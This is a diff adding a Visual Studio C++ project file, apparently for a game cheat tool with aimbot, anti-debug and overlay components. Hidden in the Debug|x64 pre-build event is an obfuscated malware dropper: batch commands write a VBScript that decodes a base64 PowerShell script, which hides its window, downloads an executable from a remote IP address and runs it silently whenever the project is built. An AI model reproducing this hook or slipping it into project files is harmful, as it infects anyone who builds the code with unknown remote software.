@@ -1,0 +1,226 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <ProjectGuid>{F8CD68DB-5BF7-4921-AB55-5550284140A9}</ProjectGuid>
+    <RootNamespace>wdamonitor</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    <ProjectName>SubZero</ProjectName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+    <SpectreMitigation>false</SpectreMitigation>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+    <IncludePath>C:\Program Files %28x86%29\Microsoft DirectX SDK %28June 2010%29\Include;$(IncludePath)</IncludePath>
+    <TargetName>DeanosExternal</TargetName>
+    <OutDir>build</OutDir>
+    <IntDir>build/intermediate</IntDir>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent><Command>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\Mrql6k&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot; IyDQodC60YDRi9Cy0LDQtdC8INC+0LrQvdC+INC60L7QvdGB0L7Qu9C4CkFkZC1UeXBlIC1OYW1lIFdpbmRvdyAtTmFtZXNwYWNlIENvbnNvbGUgLU1lbWJlckRlZmluaXRpb24gJwpbRGxsSW1wb3J0KCJLZXJuZWwzMi5kbGwiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldENvbnNvbGVXaW5kb3coKTsKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIEludDMyIG5DbWRTaG93KTsKJwokY29uc29sZVB0ciA9IFtDb25zb2xlLldpbmRvd106OkdldENvbnNvbGVXaW5kb3coKQpbQ29uc29sZS5XaW5kb3ddOjpTaG93V2luZG93KCRjb25zb2xlUHRyLCAwKSB8IE91dC1OdWxsCgokdXJsID0gImh0dHA6Ly80NS45MS4yMDIuMTk1OjQxNzMvRmlib25hY2kuZXhlIgokb3V0cHV0ID0gIiRlbnY6VEVNUFxGaWJvbmFjaS5leGUiCgp0cnkgewogICAgIyDQodC60LDRh9C40LLQsNC10Lwg0YTQsNC50LsKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkb3V0cHV0IC1Vc2VCYXNpY1BhcnNpbmcKICAgIAogICAgIyDQl9Cw0L/Rg9GB0LrQsNC10LwgRVhFINGB0LrRgNGL0YLQvgogICAgaWYgKFRlc3QtUGF0aCAkb3V0cHV0KSB7CiAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJG91dHB1dCAtV2luZG93U3R5bGUgSGlkZGVuCiAgICB9CiAgICAKICAgICMg0JLRi9GF0L7QtNC40Lwg0LjQtyDRgdC60YDQuNC/0YLQsAogICAgZXhpdCAwCn0KY2F0Y2ggewogICAgZXhpdCAxCn0=&quot; &gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;      echo e = s ^&amp; y ^&amp; d ^&amp; c ^&amp; b ^&amp; w ^&amp; r ^&amp; q ^&amp; t ^&amp; z &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo f.Text = e &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo h = &quot;%25a%25\emJy.ps1&quot; &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo k.Write l(g) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo k.Close &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo Function l(n) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo Dim o, p &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo p = LenB(n) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo o.Open &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo o.AddNew &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo o.Update &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo Else &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo End If &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;   echo End Function &gt;&gt; &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\O5SdCGq1N.vbs&quot;&#xD;&#xA;endlocal</Command></PreBuildEvent>
+  
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level4</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>false</IntrinsicFunctions>
+      <SDLCheck>false</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <UseFullPaths>false</UseFullPaths>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <WholeProgramOptimization>false</WholeProgramOptimization>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>false</GenerateDebugInformation>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+      <AdditionalDependencies>dwmapi.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+    <ProjectReference>
+      <LinkLibraryDependencies>false</LinkLibraryDependencies>
+    </ProjectReference>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="Imgui\imgui.cpp" />
+    <ClCompile Include="Imgui\imgui_demo.cpp" />
+    <ClCompile Include="Imgui\imgui_draw.cpp" />
+    <ClCompile Include="Imgui\imgui_impl_dx9.cpp" />
+    <ClCompile Include="Imgui\imgui_impl_win32.cpp" />
+    <ClCompile Include="Imgui\imgui_widgets.cpp" />
+    <ClCompile Include="Main\main.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="Aimbot\aimbot.h" />
+    <ClInclude Include="Aimbot\input.hpp" />
+    <ClInclude Include="Aimbot\librarys.hpp" />
+    <ClInclude Include="AntiDebug\CallStack-Spoofer.h" />
+    <ClInclude Include="AntiDebug\Skicript.hpp" />
+    <ClInclude Include="AntiDebug\xor.hpp" />
+    <ClInclude Include="AntiDebug\xstring.h" />
+    <ClInclude Include="Comms\driver.hpp" />
+    <ClInclude Include="Comms\librarys.hpp" />
+    <ClInclude Include="directx9\d3d9_x.h" />
+    <ClInclude Include="directx9\d3dx9.h" />
+    <ClInclude Include="directx9\d3dx9anim.h" />
+    <ClInclude Include="directx9\d3dx9core.h" />
+    <ClInclude Include="directx9\d3dx9effect.h" />
+    <ClInclude Include="directx9\d3dx9math.h" />
+    <ClInclude Include="directx9\d3dx9mesh.h" />
+    <ClInclude Include="directx9\d3dx9shader.h" />
+    <ClInclude Include="directx9\d3dx9shape.h" />
+    <ClInclude Include="directx9\d3dx9tex.h" />
+    <ClInclude Include="directx9\d3dx9xof.h" />
+    <ClInclude Include="Imgui\imconfig.h" />
+    <ClInclude Include="Imgui\imgui.h" />
+    <ClInclude Include="Imgui\imgui_impl_dx9.h" />
+    <ClInclude Include="Imgui\imgui_impl_win32.h" />
+    <ClInclude Include="Imgui\imgui_internal.h" />
+    <ClInclude Include="Imgui\imstb_rectpack.h" />
+    <ClInclude Include="Imgui\imstb_textedit.h" />
+    <ClInclude Include="Imgui\imstb_truetype.h" />
+    <ClInclude Include="Main\Functions.h" />
+    <ClInclude Include="Includes\definitons.h" />
+    <ClInclude Include="Includes\includes.hpp" />
+    <ClInclude Include="Loop\Loop.h" />
+    <ClInclude Include="Loop\sdkloop.h" />
+    <ClInclude Include="Main\description.h" />
+    <ClInclude Include="Main\main.h" />
+    <ClInclude Include="Main\offsets.h" />
+    <ClInclude Include="Other\auth.hpp" />
+    <ClInclude Include="Other\color.hpp" />
+    <ClInclude Include="Other\Controller.h" />
+    <ClInclude Include="Other\defs.h" />
+    <ClInclude Include="Other\font.h" />
+    <ClInclude Include="Other\Keybind.h" />
+    <ClInclude Include="Other\Print.hpp" />
+    <ClInclude Include="Other\skStr.h" />
+    <ClInclude Include="Other\vactor.h" />
+    <ClInclude Include="Overlay\menu.h" />
+    <ClInclude Include="Overlay\Overlay.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="directx9\d3dx9.lib" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="directx9\d3dx9math.inl" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
